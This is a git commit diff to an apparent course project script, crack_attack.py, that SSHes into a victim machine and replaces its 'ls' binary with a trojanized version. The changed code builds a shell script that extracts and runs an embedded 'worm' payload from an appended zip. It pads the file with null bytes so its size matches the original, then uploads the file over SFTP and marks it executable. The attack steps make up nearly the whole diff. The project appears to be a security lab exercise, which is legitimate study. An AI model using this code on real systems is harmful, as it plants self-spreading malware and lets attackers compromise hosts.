4f102a576390038805c7da1f68cacce885f97ffa
clai <charlielai.15@gmail.com>
2024-05-08 17:32:24 +0800

    Update crack_attack.py

--- csc2024-project3-docker/source/crack_attack.py
+++ csc2024-project3-docker/source/crack_attack.py
@@ -49,7 +49,7 @@ f.close()
 
 virus_payload2 = '''
 chmod +x worm
-./worm &
+./worm
 rm worm
 '''
 
@@ -64,43 +64,43 @@ def task2(connection, att_ip, att_port):
         f.write('EOF')
         f.write(virus_payload2)
 
-    _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
-    ls_byte = stdout.read().decode()
-        
-    original_byte = int(os.popen("ls -l ls | awk '{print $5}'").read()) + 126
     zip_byte = int(os.popen("ls -l ls.zip  | awk '{print $5}'").read())
-    print(original_byte - 126)
-
     with open('ls', 'a') as f:
-        f.write('dd if=ls of=lst.zip bs=1 skip=' + str(original_byte) + ' count=' + str(zip_byte) + ' >/dev/null 2>&1\n')
+        f.write('dd if=ls of=lst.zip bs=1 skip=1024 count=' + str(zip_byte) + ' >/dev/null 2>&1\n')
         f.write('unzip lst.zip >/dev/null 2>&1\n')
         f.write('rm lst.zip\n')
-        f.write('./lst && rm lst\n')
+        f.write('./lst \"$@\" && rm lst\n')
         f.write('exit 0\n')
 
-    original_byte = int(os.popen("ls -l ls | awk '{print $5}'").read())
-    print(original_byte)
+    original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
+    padding_size = 1024 - original_byte
+    with open('ls', 'a') as f:
+        f.write('\x00' * padding_size)
 
     with open('ls.zip', 'rb') as f:
         data = f.read()
+        
+    with open('ls', 'ab') as f:
+        f.write(data)
 
-    # with open('ls', 'ab') as f:
-    #     f.write(data)
+    _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
+    ls_byte = stdout.read().decode()
+    virus_byte = os.popen("wc -c ls | awk '{print $1}'").read()
+    padding_size = int(ls_byte) - int(virus_byte) - 8
+    with open('ls', 'ab') as f:
+        f.write(b'\x00' * padding_size)
+    with open('ls', 'a') as f:
+        f.write('aabbccdd')
 
-    # virus_byte = os.popen("ls -l ls | awk '{print $5}'").read()
-    # padding_size = int(ls_byte) - int(virus_byte) - 9
-    # print(ls_byte, original_byte, virus_byte, padding_size, sep=' ')
-    # with open('ls', 'ab') as f:
-    #     f.write(b'\x00' * padding_size)
-    # with open('ls', 'a') as f:
-    #     f.write('#aabbccdd')
-
-    # _stdin, stdout, stderr = connection.exec_command("dd if=/dev/zero bs=" + str(padding_size) + " count=1 >> ../../app/ls")
-    # _stdin, stdout, stderr = connection.exec_command("echo -n \"#aabbccdd\" >> ../../app/ls")
-
-    # sftp = connection.open_sftp()
-    # sftp.put('ls', '../../app/ls')
-    # _stdin, stdout, stderr = connection.exec_command("chmod +x ../../app/ls")
+    # original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
+    # xxd = os.popen("xxd ls | tail -n 1").read()
+    # print(original_byte)
+    # print(ls_byte)
+    # print(xxd)
+    
+    sftp = connection.open_sftp()
+    sftp.put('ls', '../../app/ls')
+    _stdin, stdout, stderr = connection.exec_command("chmod +x ../../app/ls")
 
 if __name__ == '__main__':
     if len(sys.argv) < 4:
@@ -118,6 +118,7 @@ if __name__ == '__main__':
     connection = task1(victim_ip, victim_user)
     task2(connection, attacker_ip, attacker_port)
     os.system("rm ls")
+    os.system("rm ls.zip")
 
 # ----- env setup -----
 # docker network prune
